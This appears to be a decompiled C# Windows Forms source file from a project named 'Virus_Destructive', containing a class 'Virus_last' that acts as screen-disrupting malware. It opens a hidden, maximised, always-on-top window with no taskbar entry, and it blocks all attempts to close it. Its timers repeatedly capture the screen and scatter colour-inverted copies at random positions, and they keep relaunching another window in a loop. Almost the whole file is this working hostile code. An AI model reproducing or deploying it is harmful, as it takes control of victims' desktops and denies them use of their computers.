using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Virus_Destructive;

public class Virus_last : Form
{
	private Graphics g;

	private Bitmap bmp;

	private Random r;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private PictureBox pictureBox3;

	private PictureBox pictureBox4;

	private PictureBox pictureBox5;

	private Timer tmr_loop2;

	private Timer tmr_back_to_last;

	public Virus_last()
	{
		InitializeComponent();
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void Virus_last_Load(object sender, EventArgs e)
	{
		tmr_loop2.Start();
		tmr_back_to_last.Start();
		r = new Random();
	}

	private void tmr_loop_Tick(object sender, EventArgs e)
	{
	}

	private void pictureBox5_Click(object sender, EventArgs e)
	{
	}

	private void Virus_last_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void tmr_loop_Tick_1(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Expected O, but got Unknown
		//IL_025c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0266: Expected O, but got Unknown
		//IL_02f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		//IL_03ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f6: Expected O, but got Unknown
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049f: Expected O, but got Unknown
		tmr_loop2.Stop();
		bmp = new Bitmap(500, 500);
		g = ((Control)this).CreateGraphics();
		g = Graphics.FromImage((Image)(object)bmp);
		int num = Math.Min(0, Control.get_MousePosition().X - 1);
		int num2 = Math.Min(0, Control.get_MousePosition().Y - 1);
		g.CopyFromScreen(num, num2, 0, 0, new Size(500, 500));
		pictureBox1 = new PictureBox();
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox1).set_Height(300);
		((Control)pictureBox1).set_Width(300);
		((Control)pictureBox1).set_Location(new Point(r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Width), r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Height)));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		pictureBox2 = new PictureBox();
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox2).set_Height(240);
		((Control)pictureBox2).set_Width(180);
		((Control)pictureBox2).set_Location(new Point(r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Width), r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Height)));
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		pictureBox3 = new PictureBox();
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox3).set_Height(300);
		((Control)pictureBox3).set_Width(300);
		((Control)pictureBox3).set_Location(new Point(r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Width), r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Height)));
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		pictureBox4 = new PictureBox();
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox4).set_Height(300);
		((Control)pictureBox4).set_Width(300);
		((Control)pictureBox4).set_Location(new Point(r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Width), r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Height)));
		((Control)this).get_Controls().Add((Control)(object)pictureBox4);
		pictureBox5 = new PictureBox();
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox5).set_Height(150);
		((Control)pictureBox5).set_Width(200);
		((Control)pictureBox5).set_Location(new Point(r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Width), r.Next(0, Screen.get_PrimaryScreen().get_Bounds().Height)));
		((Control)this).get_Controls().Add((Control)(object)pictureBox5);
		pictureBox1.set_Image((Image)(object)bmp);
		pictureBox2.set_Image((Image)(object)bmp);
		pictureBox3.set_Image((Image)(object)bmp);
		pictureBox4.set_Image((Image)(object)bmp);
		pictureBox5.set_Image((Image)(object)bmp);
		Bitmap val = new Bitmap(pictureBox3.get_Image());
		for (int i = 0; i <= ((Image)val).get_Height() - 1; i++)
		{
			for (int j = 0; j <= ((Image)val).get_Width() - 1; j++)
			{
				Color pixel = val.GetPixel(j, i);
				pixel = Color.FromArgb(255, 255 - pixel.R, 255 - pixel.G, 255 - pixel.B);
				val.SetPixel(j, i, pixel);
			}
		}
		pictureBox3.set_Image((Image)(object)val);
		Bitmap val2 = new Bitmap(pictureBox5.get_Image());
		for (int k = 0; k <= ((Image)val2).get_Height() - 1; k++)
		{
			for (int l = 0; l <= ((Image)val2).get_Width() - 1; l++)
			{
				Color pixel2 = val2.GetPixel(l, k);
				pixel2 = Color.FromArgb(255, 255 - pixel2.R, 255 - pixel2.G, 255 - pixel2.B);
				val2.SetPixel(l, k, pixel2);
			}
		}
		pictureBox5.set_Image((Image)(object)val2);
		tmr_loop2.Start();
	}

	private void tmr_back_to_last_Tick(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		tmr_back_to_last.Stop();
		virus_last_again virus_last_again2 = new virus_last_again();
		((Form)virus_last_again2).ShowDialog();
		tmr_back_to_last.Start();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Expected O, but got Unknown
		//IL_0376: Unknown result type (might be due to invalid IL or missing references)
		//IL_0380: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Virus_last));
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox4 = new PictureBox();
		pictureBox5 = new PictureBox();
		tmr_loop2 = new Timer(components);
		tmr_back_to_last = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_Location(new Point(1, -1));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(0, 0));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox2).set_Location(new Point(0, 0));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(0, 0));
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox3).set_Location(new Point(0, 0));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(0, 0));
		pictureBox3.set_TabIndex(2);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox4).set_Location(new Point(0, 0));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(0, 0));
		pictureBox4.set_TabIndex(3);
		pictureBox4.set_TabStop(false);
		((Control)pictureBox5).set_Location(new Point(0, 0));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(0, 0));
		pictureBox5.set_TabIndex(4);
		pictureBox5.set_TabStop(false);
		((Control)pictureBox5).add_Click((EventHandler)pictureBox5_Click);
		tmr_loop2.set_Enabled(true);
		tmr_loop2.add_Tick((EventHandler)tmr_loop_Tick_1);
		tmr_back_to_last.set_Enabled(true);
		tmr_back_to_last.add_Tick((EventHandler)tmr_back_to_last_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).get_Controls().Add((Control)(object)pictureBox5);
		((Control)this).get_Controls().Add((Control)(object)pictureBox4);
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Virus_last");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Virus_last");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Virus_last_FormClosing));
		((Form)this).add_Load((EventHandler)Virus_last_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
